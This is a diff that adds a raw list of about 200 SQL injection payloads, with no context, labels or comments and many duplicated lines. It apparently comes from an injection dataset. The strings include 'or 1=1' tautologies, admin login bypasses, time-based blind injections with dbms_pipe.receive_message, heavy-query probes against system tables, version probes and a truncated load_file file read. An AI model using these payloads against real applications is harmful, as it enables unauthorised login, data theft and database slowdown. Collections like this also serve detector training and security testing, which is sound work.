@@ -1,0 +1,200 @@
+ select * from users where id  =  1 or @#".  =  1 or 1  =  1 -- 1
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+ select * from users where id  =  1 or ";@" or 1  =  1 -- 1
+a' or 1  =  1, --
+ select * from users where id  =  1 or 1#"; or 1  =  1 -- 1
+admin' or '1'  =  '1'#
+ or uid like '%
+ select * from users where id  =  1 or "?#" or 1  =  1 -- 1
+ select * from users where id  =  1 or "  (  ]" or 1  =  1 -- 1
+1' and non_existant_table   =   '1
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  -- loao
+1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd
+admin'  )   or '1'  =  '1'#
+ select * from users where id  =  1 or ";,"  =  1 or 1  =  1 -- 1
+admin'  )   or   (  '1'  =  '1'--
+select * from users where id  =  1 +$ 1 or 1  =  1 -- 1
+or 0  =  0 #"
+ or 'x'  =  'x
+admin'or 1  =  1 or ''  =  '
+ select * from users where id  =  1 or "?#" or 1  =  1 -- 1
+and 1 in   (  select var from temp  )  --
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+1"  )   as paai where 4089  =  4089 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --
+ select * from users where id  =  1 or "1;"  =  1 or 1  =  1 -- 1
+or 1  =  1/*
+ select * from users where id  =  1 or ";@" or 1  =  1 -- 1
+0 or 1  =  1
+ select * from users where id  =  1 or "  (  ]" or 1  =  1 -- 1
+-1212%'  )   or make_set  (  7588  =  2306,2306  )   and   (  '%'  =  '
+hi'  )   or   (  'a'  =  'a
+select * from users where id  =  1 <@<@ or 1  =  1 -- 1
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+1 and 1  =  1
+? or 1  =  1 --
+ select * from users where id  =  1 or ";1" or 1  =  1 -- 1
+23 OR 1  =  1
+1%' and 4595  =  4595#
+ select * from users where id  =  1 or 1#"?  =  1 or 1  =  1 -- 1
+select * from users where id  =  1 %$ . or 1  =  1 -- 1
+admin'  )   or '1'  =  '1'/*
+ select * from users where id  =  1 or ";@" or 1  =  1 -- 1
+ select * from users where id  =  1 or "  (  #" or 1  =  1 -- 1
+select * from users where id  =  1 *1 or 1  =  1 -- 1
+1 and 1  =  1
+select * from users where id  =  1 <@.. or 1  =  1 -- 1
+select * from users where id  =  1 + $+%$ or 1  =  1 -- 1
+admin'  )   or '1'  =  '1
+select * from users where id  =  1.<@. or 1  =  1 -- 1
+ select * from users where id  =  1 or "%{" or 1  =  1 -- 1
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+admin"  )   or   (  "1"  =  "1
+1%" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --
+select * from users where id  =  1 + $+%$ or 1  =  1 -- 1
+ select * from users where id  =  1 or "?#" or 1  =  1 -- 1
+ select * from users where id  =  1 or 1#"?  =  1 or 1  =  1 -- 1
+1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd
+ select * from users where id  =  1 or "?#" or 1  =  1 -- 1
+1' in boolean mode  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #
+admin"  )   or   (  "1"  =  "1"/*
+select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1'
+select * from users where id  =  1 +$+. or 1  =  1 -- 1
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+select * from users where id  =  '1' or $<\ or 1  =  1 -- 1'
+ select * from users where id  =  1 or "1," or 1  =  1 -- 1
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+hi' or 1  =  1 --
+ select * from users where id  =  1 or "  (  ]" or 1  =  1 -- 1
+" or 1  =  1--
+ select * from users where id  =  1 or "  (  ]" or 1  =  1 -- 1
+select * from users where id  =  '1' <@&@ or 1  =  1 -- 1'
+select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1'
+hi' or 'x'  =  'x',
+admin" or 1  =  1#
+ select * from users where id  =  1 or "1  (  "  =  1 or 1  =  1 -- 1
+? or 1  =  1 --
+" or isNULL  (  1/0  )   /*
+and 1 in   (  select var from temp  )  --
+ select * from users where id  =  1 or ";#" or 1  =  1 -- 1
+ select * from users where id  =  1 or "  )  1" or 1  =  1 -- 1
+or a  =  a--
+" or "x"  =  "x
+ select * from users where id  =  1 or "1," or 1  =  1 -- 1
+select * from users where id  =  1 +  (  \  )   or 1  =  1 -- 1
+ )   or   (  a  =  a
+1 and user_name  (    )     =   'dbo'
+ select * from users where id  =  1 or "&  )  " or 1  =  1 -- 1
+ select * from users where id  =  1 or 1#"? or 1  =  1 -- 1
+1  )   and 4595  =  4595#
+ select * from users where id  =  1 or "  (  ]" or 1  =  1 -- 1
+ select * from users where id  =  1 or ".," or 1  =  1 -- 1
+or 3  =  3
+ select * from users where id  =  1 or "&  )  " or 1  =  1 -- 1
+select * from users where id  =  1.<@$ or 1  =  1 -- 1
+select * from users where id  =  '1' <@.$ or 1  =  1 -- 1'
+   )    )    or    (    (   'x'   )    )     =     (    (   'x
+ or uid like '%
+ select * from users where id  =  1 or "  (  ]" or 1  =  1 -- 1
+1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  
+select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1
+select * from users where id  =  1 +$ 1 or 1  =  1 -- 1
+or 3  =  3
+? or 1  =  1 --
+" or isNULL  (  1/0  )   /*
+admin'  )   or '1'  =  '1
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+admin"  )   or   (  "1"  =  "1"--
+1'||  (  select 'gboi' where 4191  =  4191 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'
+hi' or 'a'  =  'a
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+1%" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --
+admin' or '1'  =  '1
+ select * from users where id  =  1 or ";@" or 1  =  1 -- 1
+select * from users where id  =  1 + $+%\ or 1  =  1 -- 1
+ select * from users where id  =  1 or "  (  ]" or 1  =  1 -- 1
+1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  -- loao
+1  )   and 4595  =  4595#
+ select * from users where id  =  1 or "?#" or 1  =  1 -- 1
+or '1'  =  '1'--
+select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240
+ select * from users where id  =  1 or 1#"?  =  1 or 1  =  1 -- 1
+select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1
+select * from users where id  =  '1' <@&@ or 1  =  1 -- 1'
+admin"  )   or "1"  =  "1
+ select * from users where id  =  1 or "  (  ]" or 1  =  1 -- 1
+ select * from users where id  =  1 or ",#" or 1  =  1 -- 1
+admin"  )   or "1"  =  "1"--
+or 1  =  1 --
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+select * from users where id  =  '1' <@&1 or 1  =  1 -- 1'
+ select * from users where id  =  1 or @#".  =  1 or 1  =  1 -- 1
+hi'  )   or   (  'a'  =  'a
+select * from users where id  =  1 %!<@ or 1  =  1 -- 1
+or 1  =  1--
+select * from users where id  =  1 or $+<\ or 1  =  1 -- 1
+ select * from users where id  =  1 or "?#" or 1  =  1 -- 1
+or 0  =  0 #
+ select * from users where id  =  1 or ";@" or 1  =  1 -- 1
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+1%"  )   and 2006  =  2006
+ select * from users where id  =  1 or @#".  =  1 or 1  =  1 -- 1
+x' AND userid IS NULL, --
+ )   or   (  a  =  a
+x' AND userid IS NULL, --
+23 OR 1  =  1
+ end and    (    (   "rqay" like "rqay
+23 OR 1  =  1
+or 0  =  0 #"
+ select * from users where id  =  1 or "%_" or 1  =  1 -- 1
+-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd
+or 0  =  0 #"
+or 1  =  1#
+admin'  )   or '1'  =  '1
+select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240
+ select * from users where id  =  1 or @#".  =  1 or 1  =  1 -- 1
+select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1'
+1'||  (  select 'rawn' from dual where 4988  =  4988 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'
+ select * from users where id  =  1 or "  (  ]" or 1  =  1 -- 1
+select * from users where id  =  1 + $+%$ or 1  =  1 -- 1
+ select * from users where id  =  1 or "_  )  " or 1  =  1 -- 1
+ select * from users where id  =  1 or "$_" or 1  =  1 -- 1
+or 3  =  3
+1%"  )   and 2006  =  2006
+select * from users where id  =  '1'   or 1  =  1 -- 1'
+select * from users where id  =  '1' *$ . or 1  =  1 -- 1'
+hi or 1  =  1 --"
+select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1
+1%'   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+ select * from users where id  =  1 or "  (  ]" or 1  =  1 -- 1
+ select * from users where id  =  1 or "$_" or 1  =  1 -- 1
+ select * from users where id  =  1 or "  (  ]" or 1  =  1 -- 1
+select * from users where id  =  1 <@$ or 1  =  1 -- 1
+select * from users where id  =  '1' <@&@ or 1  =  1 -- 1'
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+select * from users where id  =  1 + \+%1 or 1  =  1 -- 1
+ select * from users where id  =  1 or ".."  =  1 or 1  =  1 -- 1
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+ select * from users where id  =  1 or ";@" or 1  =  1 -- 1
+-7999  )   or 8422  =  1336
+a' or 1  =  1--
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+ and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...
+ select * from users where id  =  1 or "1]" or 1  =  1 -- 1
+ select * from users where id  =  1 or "  (  ]" or 1  =  1 -- 1
+ select * from users where id  =  1 or "  (  ]" or 1  =  1 -- 1
+or 1  =  1 or ''  =  '
+select * from users where id  =  1 %!<@ or 1  =  1 -- 1
+ select * from users where id  =  1 or "$_" or 1  =  1 -- 1
+admin" or "1"  =  "1"#
+ or uid like '%
+ select * from users where id  =  1 or "  )  1" or 1  =  1 -- 1
+1'||  (  select 'rawn' from dual where 4988  =  4988 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'
+admin'or 1  =  1 or ''  =  '
+admin"  )   or   (  "1"  =  "1"--
+? or 1  =  1 --
+admin'  )   or '1'  =  '1'/*
+ or 1 in   (  select @@version  )  --
+select * from users where id  =  1 <@.. or 1  =  1 -- 1
+select * from users where id  =  '1' or !<@ or 1  =  1 -- 1'
